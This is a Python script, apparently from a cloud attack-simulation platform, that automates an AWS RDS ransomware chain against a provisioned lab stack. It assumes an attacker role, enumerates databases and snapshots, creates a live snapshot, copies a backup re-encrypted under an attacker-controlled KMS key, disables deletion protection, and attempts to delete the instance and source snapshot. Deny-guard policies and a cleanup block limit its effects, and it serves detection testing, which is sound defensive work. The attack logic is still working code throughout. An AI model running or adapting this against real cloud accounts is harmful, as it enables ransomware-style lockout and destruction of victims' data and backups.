# FILE: attack.py
"""
ATOMIC_RDS_RANSOMWARE_KMS -- Automated Attack Script
T1486: Data Encrypted for Impact via RDS Snapshot Re-encryption under Attacker KMS Key

3-phase attack chain:
  Phase 1 - Credential Bootstrap: assume attacker IAM role via STS
  Phase 2 - Pre-Ransomware Recon: confirm DB instance and pre-seeded snapshot
  Phase 3 - Ransomware Execution: create live snapshot, re-encrypt backup under attacker KMS key,
            then fire deny-guarded ModifyDBInstance / DeleteDBInstance / DeleteDBSnapshot to
            complete the full T1486 CloudTrail audit trail

Cleanup uses the DEFAULT boto3 session -- deny-guard blocks attacker-role from
rds:DeleteDBSnapshot and rds:DeleteDBInstance.
"""
import sys
import time
import random
import uuid
import json
import pathlib
import boto3
from botocore.exceptions import ClientError

# Cross-platform UTF-8 output -- prevents UnicodeEncodeError on Windows CP1252 terminals
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

# -- Resource names: single source of truth -----------------------------------
_NAMES_FILE = pathlib.Path(__file__).parent / "infra" / "resource_names.json"
if _NAMES_FILE.exists():
    _NAMES = json.loads(_NAMES_FILE.read_text(encoding="utf-8"))
else:
    _NAMES = {"resources": {}, "pulumi_export_keys": {}}
    print(f"[!] resource_names.json not found at {_NAMES_FILE} -- falling back to outputs only")

_R   = _NAMES.get("resources", {})
_PKS = _NAMES.get("pulumi_export_keys", {})


_TENANT_CREDS = {}


def _set_tenant_credentials(outputs):
    """Remember the tenant's short-lived credentials. In the MayaTrail backend the
    worker injects them as outputs['_aws_credentials']; without this the first STS
    call would run as the Celery worker identity instead of the tenant account."""
    _TENANT_CREDS.clear()
    _TENANT_CREDS.update((outputs or {}).get("_aws_credentials") or {})


def _base_session(region):
    """Session for the tenant's connected role, or the ambient default session for
    standalone runs where no credentials were injected."""
    if _TENANT_CREDS:
        return boto3.Session(
            aws_access_key_id=_TENANT_CREDS.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=_TENANT_CREDS.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=_TENANT_CREDS.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


def _r(key, default=""):
    """Resolve a static resource name from resource_names.json['resources']."""
    return _R.get(key, default)


def _p(outputs, semantic_key, default=""):
    """Resolve a dynamic Pulumi output: pulumi_export_keys[semantic_key] -> outputs[export_key]."""
    export_key = _PKS.get(semantic_key, semantic_key)
    return outputs.get(export_key, default)


# -- Helpers ------------------------------------------------------------------

def print_step(msg):
    print(f"\n[*] {msg}")


def print_ok(msg):
    print(f"[+] {msg}")


def print_err(msg):
    print(f"[-] {msg}")


def op_delay(min_s=2, max_s=6):
    time.sleep(random.uniform(min_s, max_s))


def phase_delay():
    time.sleep(random.uniform(5, 15))


def _poll_snapshot(rds_client, snapshot_id, timeout_s=1200, poll_interval=30):
    """Poll describe_db_snapshots until status == 'available'. Returns True/False."""
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        try:
            resp = rds_client.describe_db_snapshots(DBSnapshotIdentifier=snapshot_id)
            snaps = resp.get("DBSnapshots", [])
            if snaps:
                status = snaps[0]["Status"]
                if status == "available":
                    return True
                print_step(f"Snapshot {snapshot_id} status: {status} -- waiting...")
            time.sleep(poll_interval)
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code == "DBSnapshotNotFound":
                return False
            raise
    print_err(f"Timeout: snapshot {snapshot_id} did not reach 'available' within {timeout_s}s")
    return False


def _cleanup_snapshot(rds_default, snapshot_id):
    """
    Poll until snapshot is available (or gone), then delete it via the default session.
    Called from finally block -- must not raise.
    """
    print_step(f"Cleanup: waiting for snapshot {snapshot_id} before deletion")
    try:
        _poll_snapshot(rds_default, snapshot_id, timeout_s=1200, poll_interval=30)
    except Exception as poll_err:
        print_err(f"Cleanup: poll error for {snapshot_id}: {poll_err}")

    try:
        rds_default.delete_db_snapshot(DBSnapshotIdentifier=snapshot_id)
        print_ok(f"Cleanup: deleted snapshot {snapshot_id}")
    except ClientError as e:
        code = e.response["Error"]["Code"]
        if code == "DBSnapshotNotFound":
            print_ok(f"Cleanup: snapshot {snapshot_id} not found -- nothing to delete")
        else:
            print_err(f"Cleanup: delete snapshot {snapshot_id} failed: {e}")
    except Exception as e:
        print_err(f"Cleanup: unexpected error deleting {snapshot_id}: {e}")


# -- Entry point --------------------------------------------------------------

def run(outputs: dict, region: str = "us-east-1") -> None:
    """
    Entry point called by the MayaTrail backend.
    All resource names and credentials are read from `outputs` (Pulumi stack outputs).
    """

    # -- Resolve required Pulumi outputs via _p() -----------------------------
    # Keys are the semantic names from pulumi_export_keys in resource_names.json;
    # _p() maps them to the actual export keys used by __main__.py.
    _set_tenant_credentials(outputs)

    attacker_role_arn    = _p(outputs, "attacker_role_arn")
    db_instance_id       = _p(outputs, "db_instance_identifier")
    source_snapshot_id   = _p(outputs, "snapshot_identifier")
    attacker_kms_key_arn = _p(outputs, "attacker_kms_key_arn")

    missing = [k for k, v in {
        "attacker_role_arn":    attacker_role_arn,
        "db_instance_identifier": db_instance_id,
        "snapshot_identifier":  source_snapshot_id,
        "attacker_kms_key_arn": attacker_kms_key_arn,
    }.items() if not v]
    if missing:
        raise RuntimeError(f"Missing required stack outputs: {missing}")

    # Run-unique suffix -- prevents DBSnapshotAlreadyExists on repeat runs
    run_id = uuid.uuid4().hex[:8]

    # Default (pipeline/admin) session -- used exclusively for cleanup.
    # The deny-guard policy blocks attacker-role from rds:DeleteDBSnapshot /
    # rds:DeleteDBInstance, so all reversals must go through this session.
    default_session = _base_session(region)
    rds_default = default_session.client("rds")

    # State flags and resource IDs needed across phases and cleanup
    live_snapshot_id        = None
    reencrypted_snapshot_id = None
    modification_succeeded  = False
    events_generated        = []

    try:
        # =====================================================================
        # PHASE 1: Credential Bootstrap -- Assume Attacker Role
        # T1486: Models a compromised cloud-operations principal that already
        #        holds rds:* and kms:ReEncrypt* permissions.
        # =====================================================================
        print_step("PHASE 1: Credential Bootstrap -- assuming attacker IAM role via STS")

        sts_default = default_session.client("sts")
        assume_resp = sts_default.assume_role(
            RoleArn=attacker_role_arn,
            RoleSessionName="atomic-rds-ransomware-kms-session",
            DurationSeconds=3600,
        )
        creds = assume_resp["Credentials"]
        attacker_session = boto3.Session(
            aws_access_key_id=creds["AccessKeyId"],
            aws_secret_access_key=creds["SecretAccessKey"],
            aws_session_token=creds["SessionToken"],
            region_name=region,
        )
        events_generated.append("AssumeRole (sts.amazonaws.com)")
        print_ok(f"Assumed attacker role: {attacker_role_arn}")

        # Confirm assumed identity -- generates GetCallerIdentity CloudTrail event
        sts_attacker = attacker_session.client("sts")
        identity = sts_attacker.get_caller_identity()
        events_generated.append("GetCallerIdentity (sts.amazonaws.com)")
        print_ok(f"Attacker identity confirmed: {identity['Arn']}")

        op_delay(2, 4)
        phase_delay()

        rds_attacker = attacker_session.client("rds")

        # =====================================================================
        # PHASE 2: Pre-Ransomware Reconnaissance
        # DescribeDBInstances + DescribeDBSnapshots mirror real-world attacker
        # recon before committing the re-encryption operation.
        # =====================================================================
        print_step("PHASE 2: Pre-Ransomware Reconnaissance")

        # Step 2: Confirm target RDS instance is available
        print_step(f"Step 2: Confirming target DB instance: {db_instance_id}")
        desc_resp = rds_attacker.describe_db_instances(DBInstanceIdentifier=db_instance_id)
        events_generated.append("DescribeDBInstances (rds.amazonaws.com)")
        db_info = desc_resp["DBInstances"][0]
        db_status = db_info["DBInstanceStatus"]
        deletion_protection_current = db_info.get("DeletionProtection", False)
        actual_db_id = db_info["DBInstanceIdentifier"]
        print_ok(
            f"DB instance: {actual_db_id}, status: {db_status}, "
            f"deletion_protection: {deletion_protection_current}"
        )
        if db_status != "available":
            raise RuntimeError(
                f"DB instance {actual_db_id} is not available (status: {db_status})"
            )

        op_delay(2, 5)

        # Step 3: Enumerate manual snapshots -- confirm pre-seeded backup is present
        print_step(f"Step 3: Enumerating manual snapshots for instance: {db_instance_id}")
        snap_resp = rds_attacker.describe_db_snapshots(
            DBInstanceIdentifier=db_instance_id,
            SnapshotType="manual",
        )
        events_generated.append("DescribeDBSnapshots (rds.amazonaws.com)")
        snapshots = snap_resp.get("DBSnapshots", [])
        print_ok(f"Found {len(snapshots)} manual snapshot(s)")

        # Cross-validate source snapshot identifier against outputs
        source_snap_info = None
        for snap in snapshots:
            if (snap["DBSnapshotIdentifier"] == source_snapshot_id
                    or snap.get("DBSnapshotArn") == source_snapshot_id):
                source_snap_info = snap
                break

        if source_snap_info is None:
            # Try direct lookup in case identifier is an ARN
            try:
                direct = rds_attacker.describe_db_snapshots(
                    DBSnapshotIdentifier=source_snapshot_id
                )
                if direct.get("DBSnapshots"):
                    source_snap_info = direct["DBSnapshots"][0]
            except ClientError:
                pass

        if source_snap_info:
            snap_status = source_snap_info["Status"]
            print_ok(
                f"Source snapshot confirmed: {source_snap_info['DBSnapshotIdentifier']}, "
                f"status: {snap_status}"
            )
            if snap_status != "available":
                raise RuntimeError(
                    f"Source snapshot is not available (status: {snap_status}) -- cannot proceed"
                )
        else:
            # Snapshot may be referenced by ARN in outputs; log and continue
            print_err(
                f"Source snapshot {source_snapshot_id} not found in describe results "
                f"-- proceeding (may be ARN-format identifier)"
            )

        op_delay(2, 5)
        phase_delay()

        # =====================================================================
        # PHASE 3: Ransomware Execution
        # Core T1486 pattern: snapshot live data, re-encrypt backup under an
        # attacker-controlled KMS key, then attempt destruction of originals.
        # =====================================================================
        print_step("PHASE 3: Ransomware Execution -- re-encrypt snapshots under attacker KMS key")

        # Step 4: Snapshot the live RDS instance (capture current DB state)
        # Real APTs snapshot live data before re-encryption to prevent victim
        # from rolling forward past the ransom point.
        live_snapshot_id = f"ransomware-live-{run_id}"
        print_step(f"Step 4: Creating live snapshot: {live_snapshot_id}")
        rds_attacker.create_db_snapshot(
            DBSnapshotIdentifier=live_snapshot_id,
            DBInstanceIdentifier=db_instance_id,
        )
        events_generated.append("CreateDBSnapshot (rds.amazonaws.com)")
        print_ok(f"CreateDBSnapshot submitted: {live_snapshot_id}")

        # Must wait for 'available' before proceeding to CopyDBSnapshot
        print_step(f"Polling until {live_snapshot_id} is available (timeout 20min)...")
        if not _poll_snapshot(rds_attacker, live_snapshot_id, timeout_s=1200, poll_interval=30):
            raise RuntimeError(
                f"Live snapshot {live_snapshot_id} did not become available within timeout"
            )
        print_ok(f"Live snapshot {live_snapshot_id} is available")

        op_delay(5, 10)

        # Step 5: Copy the pre-seeded backup snapshot re-encrypted under attacker KMS key.
        # This is the core T1486 mechanism -- the original data owner loses decrypt
        # access to this copy unless the attacker cooperates. The CopyDBSnapshot
        # requestParameters.kmsKeyId referencing a foreign CMK ARN is the primary
        # CloudTrail detection signal for this technique variant.
        reencrypted_snapshot_id = f"ransomware-reencrypted-{run_id}"
        print_step(
            f"Step 5: Copying source snapshot re-encrypted under attacker KMS key\n"
            f"  source : {source_snapshot_id}\n"
            f"  target : {reencrypted_snapshot_id}\n"
            f"  kms_key: {attacker_kms_key_arn}"
        )
        rds_attacker.copy_db_snapshot(
            SourceDBSnapshotIdentifier=source_snapshot_id,
            TargetDBSnapshotIdentifier=reencrypted_snapshot_id,
            KmsKeyId=attacker_kms_key_arn,
            CopyTags=False,
        )
        events_generated.append(
            "CopyDBSnapshot (rds.amazonaws.com) - KmsKeyId=attacker-kms-key [T1486 core signal]"
        )
        print_ok(
            f"CopyDBSnapshot submitted: {reencrypted_snapshot_id} under attacker KMS key"
        )
        # Copy is async -- do NOT poll here; cleanup finally block handles it

        op_delay(5, 10)

        # Step 6: Attempt to disable DeletionProtection (prerequisite for DeleteDBInstance).
        # The deny-guard policy may block this; record both outcomes for the summary.
        print_step(
            f"Step 6: Attempting ModifyDBInstance DeletionProtection=False on: {db_instance_id}"
        )
        try:
            rds_attacker.modify_db_instance(
                DBInstanceIdentifier=db_instance_id,
                DeletionProtection=False,
                ApplyImmediately=True,
            )
            modification_succeeded = True
            events_generated.append(
                "ModifyDBInstance DeletionProtection=False (rds.amazonaws.com) - SUCCEEDED"
            )
            print_ok(
                f"ModifyDBInstance succeeded -- DeletionProtection disabled on {db_instance_id}"
            )
            # Realistic dwell time before attempting deletion
            op_delay(20, 30)
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code in ("AccessDenied", "AccessDeniedException"):
                modification_succeeded = False
                events_generated.append(
                    "ModifyDBInstance (rds.amazonaws.com) - AccessDenied (deny-guard fired)"
                )
                print_ok(
                    "ModifyDBInstance blocked by deny-guard (AccessDenied) -- expected; continuing"
                )
            else:
                raise

        op_delay(2, 5)

        # Step 7: Attempt to delete the RDS instance (expect AccessDenied).
        # deny-guard policy has explicit Deny on rds:DeleteDBInstance.
        # If this unexpectedly succeeds the instance is permanently destroyed -- halt immediately.
        print_step(
            f"Step 7: Attempting DeleteDBInstance on: {db_instance_id} (expect AccessDenied)"
        )
        try:
            rds_attacker.delete_db_instance(
                DBInstanceIdentifier=db_instance_id,
                SkipFinalSnapshot=True,
            )
            # Deny-guard is misconfigured -- instance may be gone; raise to trigger cleanup
            raise RuntimeError(
                f"CRITICAL: DeleteDBInstance on {db_instance_id} SUCCEEDED -- "
                f"deny-guard is misconfigured; instance may be permanently destroyed. Halting."
            )
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code in ("AccessDenied", "AccessDeniedException"):
                events_generated.append(
                    "DeleteDBInstance AccessDenied (rds.amazonaws.com) - deny-guard fired as expected"
                )
                print_ok("DeleteDBInstance blocked by deny-guard (AccessDenied) -- expected")
            else:
                raise

        op_delay(2, 5)

        # Step 8: Attempt to delete the source snapshot (expect AccessDenied).
        # In a real attack, removing the backup eliminates the victim's last recovery point.
        # deny-guard policy has explicit Deny on rds:DeleteDBSnapshot.
        # If this unexpectedly succeeds the backup is gone -- halt immediately.
        print_step(
            f"Step 8: Attempting DeleteDBSnapshot on source: {source_snapshot_id} (expect AccessDenied)"
        )
        try:
            rds_attacker.delete_db_snapshot(DBSnapshotIdentifier=source_snapshot_id)
            raise RuntimeError(
                f"CRITICAL: DeleteDBSnapshot on {source_snapshot_id} SUCCEEDED -- "
                f"deny-guard is misconfigured; source snapshot may be permanently destroyed. Halting."
            )
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code in ("AccessDenied", "AccessDeniedException"):
                events_generated.append(
                    "DeleteDBSnapshot AccessDenied (rds.amazonaws.com) - deny-guard fired as expected"
                )
                print_ok("DeleteDBSnapshot blocked by deny-guard (AccessDenied) -- expected")
            else:
                raise

        op_delay(2, 5)

    finally:
        # =====================================================================
        # CLEANUP: all reversals via DEFAULT boto3 session.
        # deny-guard blocks attacker-role from rds:DeleteDBSnapshot and
        # rds:DeleteDBInstance, so cleanup MUST use the pipeline/admin session.
        # =====================================================================
        print_step("CLEANUP: reverting attack-created state using default (admin) session")

        # 1. Restore DeletionProtection if the modify step succeeded
        if modification_succeeded:
            print_step(f"Cleanup: restoring DeletionProtection=True on {db_instance_id}")
            try:
                rds_default.modify_db_instance(
                    DBInstanceIdentifier=db_instance_id,
                    DeletionProtection=True,
                    ApplyImmediately=True,
                )
                print_ok(f"Cleanup: DeletionProtection restored on {db_instance_id}")
            except ClientError as e:
                print_err(f"Cleanup: failed to restore DeletionProtection: {e}")
            except Exception as e:
                print_err(f"Cleanup: unexpected error restoring DeletionProtection: {e}")

        # 2. Delete live snapshot (poll until available, then delete)
        if live_snapshot_id:
            _cleanup_snapshot(rds_default, live_snapshot_id)

        # 3. Delete re-encrypted snapshot (poll until available, then delete).
        #    Snapshot is encrypted under attacker-kms-key which pulumi destroy
        #    removes AFTER the snapshot is gone -- order matters.
        if reencrypted_snapshot_id:
            _cleanup_snapshot(rds_default, reencrypted_snapshot_id)

        print_step("CLEANUP complete")

    # -- Summary --------------------------------------------------------------
    print("\n" + "=" * 65)
    print("ATTACK COMPLETE -- CloudTrail Events Generated:")
    for i, event in enumerate(events_generated, 1):
        print(f"  {i:2d}. {event}")
    print("=" * 65)
    print(f"Technique : T1486 - Data Encrypted for Impact")
    print(f"Run ID    : {run_id}")
    print(f"DB target : {db_instance_id}")
    print(f"Snapshots : {live_snapshot_id}, {reencrypted_snapshot_id} -- cleaned up")
    print(f"Source    : {source_snapshot_id} -- intact (removed by pulumi destroy)")
